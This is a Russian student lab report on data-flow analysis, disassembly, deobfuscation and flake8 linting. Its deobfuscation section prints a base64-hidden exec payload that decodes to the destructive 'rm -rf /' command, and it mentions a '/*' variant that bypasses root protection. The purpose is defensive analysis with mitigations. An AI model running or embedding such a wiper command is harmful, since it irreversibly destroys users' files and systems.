# Отчет по практическому занятию №7. Анализ потоков данных, дизассемблирование и линтинг.

## 1. Анализ потоков данных (DFA)

Исследуемый код (с нумерацией строк):

```python
 1  def process_transaction(user_id, amount, db_connection):
 2      log_entry = "Start processing"
 3
 4      if amount > 0:
 5          status = "approved"
 6          balance = get_balance(user_id)
 7          new_balance = balance - amount
 8          update_balance(user_id, new_balance)
 9
10      log_entry = "Transaction finished with status: " + status
11
12      file = open("audit_log.txt", "w")
13      file.write(log_entry)
14
15      return status
```

### 1.1. Таблица Def-Use цепочек

| Переменная | Def (определения) | Use (использования) | Пары Def-Use |
|---|---|---|---|
| `log_entry` | строка 2 (`"Start processing"`), строка 10 (`"Transaction finished..."`) | строка 13 (`file.write(log_entry)`) | (2 → ∅), (10 → 13) |
| `status` | строка 5 (`status = "approved"`), только внутри ветки `if` | строка 10 (конкатенация), строка 15 (`return status`) | (5 → 10), (5 → 15) только при `amount > 0` |
| `balance` | строка 6 (`balance = get_balance(user_id)`) | строка 7 (`balance - amount`) | (6 → 7) |
| `new_balance` | строка 7 (`new_balance = balance - amount`) | строка 8 (`update_balance(user_id, new_balance)`) | (7 → 8) |
| `file` | строка 12 (`file = open(...)`) | строка 13 (`file.write(...)`) | (12 → 13), освобождающего use (`close`) нет |

Для полноты: параметры `user_id` (def 1; use 6, 8) и `amount` (def 1; use 4, 7) используются корректно, а параметр `db_connection` (def 1) не используется нигде.

### 1.2. Описание выявленных дефектов

- **Дефект 1 (Неинициализированная переменная).** Переменная `status` определяется только внутри блока `if amount > 0` (строка 5). Если `amount <= 0`, то существует путь выполнения `1 → 2 → 4 → 10`, на котором определения `status` нет, и на строке 10 (конкатенация), а затем на строке 15 (`return status`) переменная читается без значения. Результат: `UnboundLocalError`. Обычный синтаксический линтер этого не видит, так как проблема видна только по графу потока управления. Исправление: задать значение до `if` (`status = "declined"`).

- **Дефект 2 (Мертвое присваивание).** Значение `"Start processing"`, присвоенное `log_entry` на строке 2, на всех путях перезаписывается на строке 10 раньше, чем читается на строке 13, поэтому определение из строки 2 не имеет ни одного использования (Dead Store). Следствие: сообщение о начале обработки никогда не попадает в аудит-лог, то есть это ещё и логическая ошибка. Исправление: накапливать сообщения в списке `log_lines` и записывать их все вместе. Дополнительно: параметр `db_connection` нигде не используется.

- **Дефект 3 (Утечка ресурса).** Файл открывается на строке 12 (`open("audit_log.txt", "w")`), записывается на строке 13, но на пути к `return` нет `file.close()` и не используется менеджер контекста. Дескриптор остаётся открытым до сборки мусора, данные могут не сброситься из буфера на диск, а при исключении на строке 13 ресурс не освобождается совсем. Исправление: `with open(..., "a", encoding="utf-8") as file:`. Режим `"w"` заменён на `"a"`, потому что иначе каждый вызов стирал бы предыдущие записи аудита.

### 1.3. Исправленный код (`src/fixed_transaction.py`)

```python
def process_transaction(user_id, amount, db_connection):
    """Process a loyalty transaction and write an audit record."""
    log_lines = ["Start processing"]

    status = "declined"

    if amount > 0:
        status = "approved"
        balance = get_balance(user_id)
        new_balance = balance - amount
        update_balance(user_id, new_balance)

    log_lines.append("Transaction finished with status: " + status)

    with open("audit_log.txt", "a", encoding="utf-8") as file:
        file.write("\n".join(log_lines) + "\n")

    return status
```

В файле также определены заглушки `get_balance` и `update_balance`, чтобы flake8 не выдавал ошибку `F821` (undefined name).

## 2. Дизассемблирование

Исходный фрагмент (x86-64, AT&T):

```asm
        movl    $0, -4(%rbp)
        movl    $1, -8(%rbp)
        jmp     .L2
.L3:
        movl    -8(%rbp), %eax
        addl    %eax, -4(%rbp)
        addl    $1, -8(%rbp)
.L2:
        cmpl    $10, -8(%rbp)
        jle     .L3
        movl    -4(%rbp), %eax
```

### 2.1. Восстановленный код

Python:

```python
def sum_to_10():
    total = 0
    i = 1
    while i <= 10:
        total += i
        i += 1
    return total
```

C:

```c
int sum_to_10(void) {
    int total = 0;
    for (int i = 1; i <= 10; i++) {
        total += i;
    }
    return total;
}
```

### 2.2. Краткое пояснение логики

- `-4(%rbp)` — аккумулятор (`total`), инициализируется нулём; `-8(%rbp)` — счётчик цикла (`i`), инициализируется единицей. Обе переменные лежат на стеке, что типично для кода без оптимизаций (`-O0`).
- `jmp .L2` сразу переходит к проверке условия, то есть это цикл с предусловием.
- `cmpl $10, -8(%rbp)` и `jle .L3` реализуют условие `i <= 10` (знаковое «меньше или равно»), поэтому граница 10 включается в сумму.
- Тело цикла (`.L3`): `eax = i`, `total += eax`, `i += 1`.
- После выхода из цикла `movl -4(%rbp), %eax` помещает `total` в `%eax`, где по соглашению System V AMD64 возвращается результат.
- Итог: функция вычисляет сумму целых чисел от 1 до 10 и возвращает **55**.

## 3. Деобфускация

Исследуемый код:

```python
a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
import base64
b = base64.b64decode(a).decode('utf-8')
exec(b)
```

Декодирование выполнялось без запуска `exec`: только `base64.b64decode(...).decode('utf-8')`.

### 3.1. Расшифрованная строка

```python
import os; os.system('rm -rf /')
```

### 3.2. Анализ угрозы

`exec(b)` выполняет расшифрованную строку как Python-код: импортирует модуль `os` и запускает команду оболочки `rm -rf /`.

- `rm` удаляет файлы, `-r` делает это рекурсивно, `-f` отключает запросы подтверждения и сообщения об ошибках, `/` — корень файловой системы.
- Последствия: необратимое удаление всех файлов, доступных процессу на запись (пользовательские данные, исходный код, конфигурации, базы данных, логи, подключённые диски и резервные копии). При запуске от root уничтожается вся система и сервисы перестают работать, при запуске от обычного пользователя теряется всё, что ему доступно на запись.
- GNU `rm` по умолчанию отказывается удалять `/` (`--preserve-root`), но в других реализациях (BusyBox, старые системы, контейнеры) такой защиты может не быть, а вариант `rm -rf /*` обходит её. Полагаться на неё нельзя.
- Base64 здесь только скрывает нагрузку от простого поиска по ключевым словам (`rm`, `os.system`) и беглого ревью; это не защита, а обфускация. Нагрузка может быть заменена на любую другую (кража данных, шифровальщик, обратная оболочка).
- Классификация: выполнение произвольного кода (CWE-94/95), внедрение команд ОС (CWE-78), вредоносный деструктивный код (wiper).

### 3.3. Методы защиты

- **На уровне кода:** не использовать `exec`/`eval`/`compile` на недоверенных данных; вместо `os.system` и `shell=True` применять `subprocess.run([...], shell=False)` с белым списком команд; проверять все внешние данные по строгой схеме и белому списку (валидация входных данных); для безопасного разбора данных использовать `ast.literal_eval`, `json`, `yaml.safe_load`.
- **Статический анализ и ревью:** Bandit (`B102`, `B307`, `B602`/`B605`), Semgrep, CodeQL, SonarQube в CI/CD с блокировкой слияния при срабатывании; правила на цепочку «decode → exec»; обязательное code review с вниманием к закодированным строкам и сторонним зависимостям.
- **Среда выполнения (defense in depth):** принцип наименьших привилегий (запуск не от root), контейнеры с read-only корневой ФС, seccomp/AppArmor/SELinux, неизменяемые резервные копии (правило 3-2-1), контроль зависимостей (lock-файлы, проверка хешей, `pip-audit`), мониторинг массового удаления файлов и неожиданного запуска оболочки из Python.

## 4. Настройка и прохождение линтера

### 4.1. Описание настроенных правил в файле `.flake8`

```ini
[flake8]
max-line-length = 80
extend-ignore = E203, W503
exclude = .git,__pycache__,docs
```

- `max-line-length = 80` — максимально допустимая длина строки (ошибка `E501` при превышении).
- `extend-ignore = E203, W503` — к правилам по умолчанию добавляется игнорирование `E203` (пробел перед `:`, например в срезах) и `W503` (перенос строки перед бинарным оператором). Оба правила конфликтуют с форматированием, принятым в black, и считаются спорными.
- `exclude = .git,__pycache__,docs` — каталоги, которые flake8 не проверяет: служебные данные git, кэш Python и документация (`docs`, где лежат отчёты в Markdown).

Файл `.github/workflows/lint-check.yml` запускает `flake8 .` на `ubuntu-latest` с Python 3.10 при создании Pull Request в ветку `develop`.

В ходе работы линтер нашёл и помог исправить следующие замечания:

- `W292 no newline at end of file` в `config.py` — добавлен перевод строки в конец файла.
